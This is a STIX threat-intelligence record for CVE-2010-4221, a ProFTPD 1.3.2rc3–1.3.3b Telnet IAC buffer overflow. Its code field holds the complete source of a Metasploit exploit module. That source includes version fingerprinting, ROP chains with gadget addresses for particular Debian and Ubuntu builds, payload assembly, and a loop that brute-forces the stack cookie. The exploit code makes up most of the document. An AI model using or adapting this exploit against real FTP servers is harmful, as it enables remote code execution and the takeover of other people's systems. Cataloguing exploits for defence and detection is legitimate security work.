{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4b1dc2d5-2e75-4853-b0f3-d6b81dbee237",
    "created": "2024-08-14T16:59:54.607989Z",
    "modified": "2024-08-14T16:59:54.607994Z",
    "name": "ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)",
    "description": " This module exploits a stack-based buffer overflow in versions of ProFTPD server between versions 1.3.2rc3 and 1.3.3b. By sending data containing a large number of Telnet IAC commands, an attacker can corrupt memory and execute arbitrary code.  The Debian Squeeze version of the exploit uses a little ROP stub to indirectly transfer the flow of execution to a pool buffer (the cmd_rec \"res\" in \"pr_cmd_read\").  The Ubuntu version uses a ROP stager to mmap RWX memory, copy a small stub to it, and execute the stub. The stub then copies the remainder of the payload in and executes it.  NOTE: Most Linux distributions either do not ship a vulnerable version of ProFTPD, or they ship a version compiled with stack smashing protection.  Although SSP significantly reduces the probability of a single attempt succeeding, it will not prevent exploitation. Since the daemon forks in a default configuration, the cookie value will remain the same despite some attempts failing. By making repeated requests, an attacker can eventually guess the cookie value and exploit the vulnerability.  The cookie in Ubuntu has 24-bits of entropy. This reduces the effectiveness and could allow exploitation in semi-reasonable amount of time. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/ftp/proftp_telnet_iac.rb",
            "external_id": "proftp_telnet_iac.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-4221"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  #include Msf::Exploit::Remote::Ftp\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in versions of ProFTPD\n        server between versions 1.3.2rc3 and 1.3.3b. By sending data containing a\n        large number of Telnet IAC commands, an attacker can corrupt memory and\n        execute arbitrary code.\n\n        The Debian Squeeze version of the exploit uses a little ROP stub to indirectly\n        transfer the flow of execution to a pool buffer (the cmd_rec \"res\" in\n        \"pr_cmd_read\").\n\n        The Ubuntu version uses a ROP stager to mmap RWX memory, copy a small stub\n        to it, and execute the stub. The stub then copies the remainder of the payload\n        in and executes it.\n\n        NOTE: Most Linux distributions either do not ship a vulnerable version of\n        ProFTPD, or they ship a version compiled with stack smashing protection.\n\n        Although SSP significantly reduces the probability of a single attempt\n        succeeding, it will not prevent exploitation. Since the daemon forks in a\n        default configuration, the cookie value will remain the same despite\n        some attempts failing. By making repeated requests, an attacker can eventually\n        guess the cookie value and exploit the vulnerability.\n\n        The cookie in Ubuntu has 24-bits of entropy. This reduces the effectiveness\n        and could allow exploitation in semi-reasonable amount of time.\n      },\n      'Author'         => [ 'jduck' ],\n      'References'     =>\n        [\n          ['CVE', '2010-4221'],\n          ['OSVDB', '68985'],\n          ['BID', '44562']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'PrependChrootBreak' => true\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 4096,\n          # NOTE: \\xff are avoided here so we can control the number of them being sent.\n          'BadChars' => \"\\x09\\x0a\\x0b\\x0c\\x0d\\x20\\xff\",\n          'DisableNops'\t=>  'True',\n        },\n      'Platform'       => [ 'linux' ],\n      'Targets'        =>\n      [\n        #\n        # Automatic targeting via fingerprinting\n        #\n        [ 'Automatic Targeting', { 'auto' => true }  ],\n\n        #\n        # This special one comes first since we dont want its index changing.\n        #\n        [\t'Debug',\n          {\n            'IACCount' => 8192, # should cause crash writing off end of stack\n            'Offset' => 0,\n            'Ret' => 0x41414242,\n            'Writable' => 0x43434545\n          }\n        ],\n\n        #\n        # specific targets\n        #\n\n        # NOTE: this minimal rop works most of the time, but it can fail\n        # if the proftpd pool memory is in a different order for whatever reason...\n        [ 'ProFTPD 1.3.3a Server (Debian) - Squeeze Beta1',\n          {\n            'IACCount' => 4096+16,\n            'Offset' => 0x102c-4,\n            # NOTE: All addresses are from the proftpd binary\n            'Ret' => 0x805a547, # pop esi / pop ebp / ret\n            'Writable' => 0x80e81a0, # .data\n            'RopStack' =>\n              [\n                # Writable is here\n                0xcccccccc, # unused\n                0x805a544,  # mov eax,esi / pop ebx / pop esi / pop ebp / ret\n                0xcccccccc, # becomes ebx\n                0xcccccccc, # becomes esi\n                0xcccccccc, # becomes ebp\n                # quadruple deref the res pointer :)\n                0x8068886,  # mov eax,[eax] / ret\n                0x8068886,  # mov eax,[eax] / ret\n                0x8068886,  # mov eax,[eax] / ret\n                0x8068886,  # mov eax,[eax] / ret\n                # skip the pool chunk header\n                0x805bd8e,  # inc eax / adc cl, cl / ret\n                0x805bd8e,  # inc eax / adc cl, cl / ret\n                0x805bd8e,  # inc eax / adc cl, cl / ret\n                0x805bd8e,  # inc eax / adc cl, cl / ret\n                0x805bd8e,  # inc eax / adc cl, cl / ret\n                0x805bd8e,  # inc eax / adc cl, cl / ret\n                0x805bd8e,  # inc eax / adc cl, cl / ret\n                0x805bd8e,  # inc eax / adc cl, cl / ret\n                0x805bd8e,  # inc eax / adc cl, cl / ret\n                0x805bd8e,  # inc eax / adc cl, cl / ret\n                0x805bd8e,  # inc eax / adc cl, cl / ret\n                0x805bd8e,  # inc eax / adc cl, cl / ret\n                0x805bd8e,  # inc eax / adc cl, cl / ret\n                0x805bd8e,  # inc eax / adc cl, cl / ret\n                0x805bd8e,  # inc eax / adc cl, cl / ret\n                0x805bd8e,  # inc eax / adc cl, cl / ret\n                # execute the data :)\n                0x0805c26c, # jmp eax\n              ],\n          }\n        ],\n\n        # For the version compiled with symbols :)\n        [ 'ProFTPD 1_3_3a Server (Debian) - Squeeze Beta1 (Debug)',\n          {\n            'IACCount' => 4096+16,\n            'Offset' => 0x1028-4,\n            # NOTE: All addresses are from the proftpd binary\n            'Writable' => 0x80ec570, # .data\n            'Ret' => 0x80d78c2, # pop esi / pop ebp / ret\n            'RopStack' =>\n              [\n                # Writable is here\n                #0x0808162a, # jmp esp (works w/esp fixup)\n                0xcccccccc, # unused becomes ebp\n                0x80d78c2,  # mov eax,esi / pop esi / pop ebp / ret\n                0xcccccccc, # unused becomes esi\n                0xcccccccc, # unused becomes ebp\n                # quadruple deref the res pointer :)\n                0x806a915,  # mov eax,[eax] / pop ebp / ret\n                0xcccccccc, # unused becomes ebp\n                0x806a915,  # mov eax,[eax] / pop ebp / ret\n                0xcccccccc, # unused becomes ebp\n                0x806a915,  # mov eax,[eax] / pop ebp / ret\n                0xcccccccc, # unused becomes ebp\n                0x806a915,  # mov eax,[eax] / pop ebp / ret\n                0xcccccccc, # unused becomes ebp\n                # skip the pool chunk header\n                0x805d6a9,  # inc eax / adc cl, cl / ret\n                0x805d6a9,  # inc eax / adc cl, cl / ret\n                0x805d6a9,  # inc eax / adc cl, cl / ret\n                0x805d6a9,  # inc eax / adc cl, cl / ret\n                0x805d6a9,  # inc eax / adc cl, cl / ret\n                0x805d6a9,  # inc eax / adc cl, cl / ret\n                0x805d6a9,  # inc eax / adc cl, cl / ret\n                0x805d6a9,  # inc eax / adc cl, cl / ret\n                0x805d6a9,  # inc eax / adc cl, cl / ret\n                0x805d6a9,  # inc eax / adc cl, cl / ret\n                0x805d6a9,  # inc eax / adc cl, cl / ret\n                0x805d6a9,  # inc eax / adc cl, cl / ret\n                0x805d6a9,  # inc eax / adc cl, cl / ret\n                0x805d6a9,  # inc eax / adc cl, cl / ret\n                0x805d6a9,  # inc eax / adc cl, cl / ret\n                0x805d6a9,  # inc eax / adc cl, cl / ret\n                # execute the data :)\n                0x08058de6, # jmp eax\n              ],\n          }\n        ],\n\n        [ 'ProFTPD 1.3.2c Server (Ubuntu 10.04)',\n          {\n            'IACCount' => 1018,\n            'Offset' => 0x420,\n            'CookieOffset' => -0x20,\n            'Writable' => 0x80db3a0, # becomes esi (beginning of .data)\n            'Ret' => 0x805389b,  # pop esi / pop ebp / ret\n            'RopStack' =>\n              [\n                0xcccccccc, # becomes ebp\n\n                0x8080f04,  # pop eax / ret\n                0x80db330,  # becomes eax (GOT of mmap64)\n\n                0x806a716,  # mov eax, [eax] / ret\n                0x805dd5c,  # jmp eax\n                0x80607b2,  # add esp, 0x24 / pop ebx / pop ebp / ret\n                # mmap args\n                0, 0x20000, 0x7, 0x22, 0xffffffff, 0,\n                0, # unused\n                0xcccccccc, # unused\n                0xcccccccc, # unused\n                0x100000000 - 0x5d5b24c4 + 0x80db3a4, # becomes ebx\n                0xcccccccc, # becomes ebp\n\n                # note, ebx gets fixed above :)\n                # 0xfe in 'ah' doesn't matter since we have more than enough space.\n                # now, load an instruction to store to eax\n                0x808b542,  # pop edx / mov ah, 0xfe / inc dword ptr [ebx+0x5d5b24c4] / ret\n                # becomes edx - mov [eax+ebp*4]; ebx / ret\n                \"\\x89\\x1c\\xa8\\xc3\".unpack('V').first,\n\n                # store it :)\n                0x805c2d0,  # mov [eax], edx / add esp, 0x10 / pop ebx / pop esi / pop ebp / ret\n                0xcccccccc, # unused\n                0xcccccccc, # unused\n                0xcccccccc, # unused\n                0xcccccccc, # unused\n                0xcccccccc, # becomes ebx\n                0xcccccccc, # becomes esi\n                0xcccccccc, # becomes ebp\n\n                # Copy the following stub:\n                #\"\\x8d\\xb4\\x24\\x21\\xfb\\xff\\xff\" # lea esi, [esp-0x4df]\n                #\"\\x8d\\x78\\x12\"  # lea edi, [eax+0x12]\n                #\"\\x6a\\x7f\"   # push 0x7f\n                #\"\\x59\"\t    # pop ecx\n                #\"\\xf2\\xa5\"   # rep movsd\n\n                0x80607b5,  # pop ebx / pop ebp / ret\n                0xfb2124b4, # becomes ebx\n                1, # becomes ebp\n                0x805dd5c,  # jmp eax\n\n                0x80607b5,  # pop ebx / pop ebp / ret\n                0x788dffff, # becomes ebx\n                2, # becomes ebp\n                0x805dd5c,  # jmp eax\n\n                0x80607b5,  # pop ebx / pop ebp / ret\n                0x597f6a12, # becomes ebx\n                3, # becomes ebp\n                0x805dd5c,  # jmp eax\n\n                0x80607b5,  # pop ebx / pop ebp / ret\n                0x9090a5f2, # becomes ebx\n                4, # becomes ebp\n                0x805dd5c,  # jmp eax\n\n                0x80607b5,  # pop ebx / pop ebp / ret\n                0x8d909090, # becomes ebx\n                0, # becomes ebp\n                0x805dd5c,  # jmp eax\n\n                # hopefully we dont get here\n                0xcccccccc,\n              ],\n          }\n        ]\n\n      ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-11-01'))\n\n    register_options(\n      [\n        Opt::RPORT(21),\n      ])\n  end\n\n\n  def check\n    # NOTE: We don't care if the login failed here...\n    ret = connect\n    banner = sock.get_once || ''\n\n    # We just want the banner to check against our targets..\n    vprint_status(\"FTP Banner: #{banner.strip}\")\n\n    status = CheckCode::Safe\n    if banner =~ /ProFTPD (1\\.3\\.[23])/i\n      banner_array = banner.split('.')\n\n      if banner_array.count() > 0 && !banner_array[3].nil?\n        # gets 1 char on the third part of version number.\n        relnum = banner_array[2][0..0]\n        tmp = banner_array[2].split(' ')\n        # gets extra string info of version number.\n        # example: 1.2.3rc ('rc' string)\n        extra = tmp[0][1..(tmp[0].length - 1)]\n        if relnum == '2'\n          if extra.length > 0\n            if extra[0..1] == 'rc'\n              v = extra[2..extra.length].to_i\n              if v && v > 2\n                status = CheckCode::Appears\n              end\n            else\n              status = CheckCode::Appears\n            end\n          end\n        elsif relnum == '3'\n          if [ '', 'a', 'b', ].include?(extra)\n            status = CheckCode::Appears\n          end\n        end\n      end\n    end\n\n    disconnect\n    return status\n  end\n\n\n  def exploit\n    connect\n    banner = sock.get_once || ''\n\n    # Use a copy of the target\n    mytarget = target\n\n    if (target['auto'])\n      mytarget = nil\n\n      print_status(\"Automatically detecting the target...\")\n      if (banner and (m = banner.match(/ProFTPD (1\\.3\\.[23][^ ]) Server/i))) then\n        print_status(\"FTP Banner: #{banner.strip}\")\n        version = m[1]\n      else\n        fail_with(Failure::NoTarget, \"No matching target\")\n      end\n\n      regexp = Regexp.escape(version)\n      self.targets.each do |t|\n        if (t.name =~ /#{regexp}/) then\n          mytarget = t\n          break\n        end\n      end\n\n      if (not mytarget)\n        fail_with(Failure::NoTarget, \"No matching target\")\n      end\n\n      print_status(\"Selected Target: #{mytarget.name}\")\n    else\n      print_status(\"Trying target #{mytarget.name}...\")\n      if banner\n        print_status(\"FTP Banner: #{banner.strip}\")\n      end\n    end\n\n    #puts \"attach and press any key\"; bleh = $stdin.gets\n\n    buf = ''\n    buf << 'SITE '\n\n    #buf << \"\\xcc\"\n    if mytarget['CookieOffset']\n      buf << \"\\x8d\\xa0\\xfc\\xdf\\xff\\xff\"  # lea esp, [eax-0x2004]\n    end\n    buf << payload.encoded\n\n    # The number of characters left must be odd at this point.\n    buf << rand_text(1) if (buf.length % 2) == 0\n    buf << \"\\xff\" * (mytarget['IACCount'] - payload.encoded.length)\n\n    buf << rand_text_alphanumeric(mytarget['Offset'] - buf.length)\n\n    addrs = [\n      mytarget['Ret'],\n      mytarget['Writable']\n    ].pack('V*')\n\n    if mytarget['RopStack']\n      addrs << mytarget['RopStack'].map { |e|\n        if e == 0xcccccccc\n          rand_text(4).unpack('V').first\n        else\n          e\n        end\n      }.pack('V*')\n    end\n\n    # Make sure we didn't introduce instability\n    addr_badchars = \"\\x09\\x0a\\x0b\\x0c\\x20\"\n    if idx = Rex::Text.badchar_index(addrs, addr_badchars)\n      fail_with(Failure::Unknown, (\"One or more address contains a bad character! (0x%02x @ 0x%x)\" % [addrs[idx,1].unpack('C').first, idx]))\n    end\n\n    buf << addrs\n    buf << \"\\r\\n\"\n\n\n    #\n    # In the case of Ubuntu, the cookie has 24-bits of entropy. Further more, it\n    # doesn't change while proftpd forks children. Therefore, we can try forever\n    # and eventually guess it correctly.\n    #\n    # NOTE: if the cookie contains one of our bad characters, we're SOL.\n    #\n    if mytarget['CookieOffset']\n      print_status(\"!!! Attempting to bruteforce the cookie value! This can takes days. !!!\")\n\n      disconnect\n\n      max = 0xffffff00\n      off = mytarget['Offset'] + mytarget['CookieOffset']\n\n      cookie = last_cookie = 0\n      #cookie = 0x17ccd600\n\n      start = Time.now\n      last = start - 10\n\n      while not session_created?\n        now = Time.now\n        if (now - last) >= 10\n          perc = (cookie * 100) / max\n          qps = ((cookie - last_cookie) >> 8) / 10.0\n          print_status(\"%.2f%% complete, %.2f attempts/sec - Trying: 0x%x\" % [perc, qps, cookie])\n          last = now\n          last_cookie = cookie\n        end\n\n        sd = connect(false)\n        sd.get_once\n        buf[off, 4] = [cookie].pack('V')\n        sd.put(buf)\n        disconnect(sd)\n\n        cookie += 0x100\n        break if cookie > max\n      end\n\n      if not session_created?\n        fail_with(Failure::Unknown, \"Unable to guess the cookie value, sorry :-/\")\n      end\n    else\n      sock.put(buf)\n      disconnect\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-11-01",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}